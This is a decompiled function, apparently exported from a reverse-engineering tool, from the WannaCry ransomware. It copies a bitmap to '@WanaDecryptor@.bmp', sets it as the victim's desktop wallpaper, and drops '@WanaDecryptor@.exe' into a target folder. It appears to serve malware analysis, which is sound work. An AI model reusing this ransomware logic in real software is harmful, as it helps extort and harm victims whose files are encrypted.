// --- Metadata ---
// Function Name: SetupWallpaperAndDrop_10004F20
// Address: 0x10004F20
// Exported At: 20250522_121024
// Signature: unknown_signature
// ---------------
int __stdcall SetupWallpaperAndDrop_10004F20(wchar_t *Format, wchar_t *String2, int a3)
{
  DWORD pcbBuffer; // [esp+10h] [ebp-614h] BYREF
  wchar_t Buffer; // [esp+14h] [ebp-610h] BYREF
  char v6[516]; // [esp+16h] [ebp-60Eh] BYREF
  __int16 v7; // [esp+21Ah] [ebp-40Ah]
  WCHAR String1; // [esp+21Ch] [ebp-408h] BYREF
  char v9[508]; // [esp+21Eh] [ebp-406h] BYREF
  __int16 v10; // [esp+41Ah] [ebp-20Ah]
  WCHAR WideCharStr; // [esp+41Ch] [ebp-208h] BYREF
  char v12[516]; // [esp+41Eh] [ebp-206h] BYREF
  __int16 v13; // [esp+622h] [ebp-2h]

  Buffer = word_1000D918;
  memset(v6, 0, sizeof(v6));
  v7 = 0;
  WideCharStr = word_1000D918;
  memset(v12, 0, sizeof(v12));                  // 구성 요소 파일을 복사하고 배경화면을 설정하는 기능 
  v13 = 0;
  swprintf(&Buffer, (const size_t)L"%s\\%s", Format, L"@WanaDecryptor@.bmp");
  MultiByteToWideChar(0, 0, "b.wnry", -1, &WideCharStr, 259);
  if ( CopyFileW(&WideCharStr, &Buffer, 0) )
  {
    String1 = word_1000D918;
    memset(v9, 0, sizeof(v9));
    v10 = 0;
    pcbBuffer = 255;
    GetUserNameW(&String1, &pcbBuffer);
    if ( !wcsicmp(&String1, String2) )
      SystemParametersInfoW(0x14u, 0, &Buffer, 1u);
  }
  swprintf(&Buffer, (const size_t)L"%s\\%s", Format, L"@WanaDecryptor@.exe");
  CopyFileW(L"@WanaDecryptor@.exe", &Buffer, 0);
  return 1;
}
